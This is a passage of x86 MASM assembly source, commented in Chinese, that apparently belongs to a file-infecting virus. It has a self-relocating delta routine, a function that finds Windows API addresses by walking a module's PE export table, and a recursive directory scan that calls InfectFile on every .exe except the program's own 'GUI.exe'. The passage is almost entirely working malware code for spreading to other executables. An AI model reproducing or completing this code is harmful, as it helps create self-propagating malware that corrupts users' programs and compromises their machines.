
```
                                .endif

                        .endif

                        sub        edi,010000h

                        .break        .if edi < 070000000h

                .endw

                popad

                mov        eax,@dwReturn

                ret

\_GetKernelBase        endp

\_GetApi        proc        \_hModule,\_lpszApi,\_cnt

                local        @dwReturn,@dwStringLength

                pushad

                mov        @dwReturn,0

;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

; 重定位

;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

                call        @F

                @@:

                pop        ebx

                sub        ebx,offset @B

;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

; 计算 API 字符串的长度（带尾部的0）

;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

                mov        ecx,\_cnt

                mov        @dwStringLength,ecx

;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

; 从 PE 文件头的数据目录获取导出表地址

;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

                mov        esi,\_hModule

                add        esi,[esi + 3ch]

                assume        esi:ptr IMAGE\_NT\_HEADERS

                mov        esi,[esi].OptionalHeader.DataDirectory.VirtualAddress

                add        esi,\_hModule

                assume        esi:ptr IMAGE\_EXPORT\_DIRECTORY

;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

; 查找符合名称的导出函数名

;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

                mov        ebx,[esi].AddressOfNames

                add        ebx,\_hModule

                xor        edx,edx

                .repeat

                        push        esi

                        mov        edi,[ebx]

                        add        edi,\_hModule

                        mov        esi,\_lpszApi

                        mov        ecx,@dwStringLength

                        repz        cmpsb

                        .if        ZERO?

                                pop        esi

                                jmp        @F

                        .endif

                        pop        esi

                        add        ebx,4

                        inc        edx

                .until        edx >=        [esi].NumberOfNames

                jmp        \_Error

@@:

;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

; API名称索引 --> 序号索引 --> 地址索引

;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

                sub        ebx,[esi].AddressOfNames

                sub        ebx,\_hModule

                shr        ebx,1

                add        ebx,[esi].AddressOfNameOrdinals

                add        ebx,\_hModule

                movzx        eax,WORD  ptr [ebx]

                shl        eax,2

                add        eax,[esi].AddressOfFunctions

                add        eax,\_hModule

;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

; 从地址表得到导出函数地址

;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

                mov        eax,[eax]

                add        eax,\_hModule

                mov        @dwReturn,eax

\_Error:

                popad

                mov        eax,@dwReturn

                ret

\_GetApi                endp

        allfile db '\*.\*',0

        nextdir db '\',0

        wfd        WIN32\_FIND\_DATA <0>

        ext          db '.exe',0

        self                        db 'GUI.exe',0

EnumDir PROC DirName : DWORD

        local hSearch:DWORD

        local DirorFile[128]:DWORD

        pushad

        push DirName

        lea esi,DirorFile

        push esi

        call \_lstrcpy[ebx]

        push esi                                                        ;当前目录

        call \_SetCurrentDirectory[ebx]

        lea edi,[offset wfd+ebx]

        push edi

        lea eax,[offset allfile+ebx]

        push eax

        call \_FindFirstFile[ebx]

        cmp eax,INVALID\_HANDLE\_VALUE

        jz ED\_Exit

        mov hSearch,eax

        .repeat

                mov eax,DWORD ptr [offset wfd+ebx]

                and eax,FILE\_ATTRIBUTE\_DIRECTORY

                .if eax == FILE\_ATTRIBUTE\_DIRECTORY

                        .if BYTE ptr [wfd+44+ebx]!='.'

                                push DirName

                                lea esi,DirorFile

                                PUSH ESI                                ;esi指向局部缓冲区

                                call \_lstrcpy[ebx]

                                lea eax,[offset nextdir+ebx]

                                push eax

                                push esi

                                call \_lstrcat[ebx]

                                lea eax,[offset wfd+44+ebx]

                                push eax

                                push esi

                                call \_lstrcat[ebx]

                                push esi

                                call EnumDir

                        .endif

                .else

                        .if BYTE ptr [wfd+44+ebx]!='.'

                                pushad

                                lea eax,[offset wfd.cFileName+ebx]

                                push eax

                                call \_lstrlen[ebx]

                           sub  eax,4

                           mov  esi,eax             ;esi=扩展名位置

                           lea edx,[offset ext+ebx]

                           push edx

                           lea eax,wfd.cFileName[esi]

                           add eax,ebx

                           push eax

                           call \_lstrcmpi[ebx]

                           cmp eax,0

                           jnz j1

                           push DirName

                           lea esi,DirorFile

                           push esi

                           call \_lstrcpy[ebx]

                           lea eax,[offset nextdir+ebx]

                           push eax

                           push esi

                           call \_lstrcat[ebx]

                           lea eax,[offset wfd.cFileName+ebx]

                           lea edx,[offset self+ebx]

                           push eax

                           push edx

                           call \_lstrcmpi[ebx]

                           cmp eax,0

                           jz j1

                           lea eax,[offset wfd.cFileName+ebx]

                           push eax

                           push esi

                           call \_lstrcat[ebx]

                           push esi

                           call InfectFile

                           j1:

                           popad

                   .endif

                .endif

                push edi

                push hSearch

                call \_FindNextFile[ebx]

        .until eax == 0

ED\_Close:

        push hSearch
```
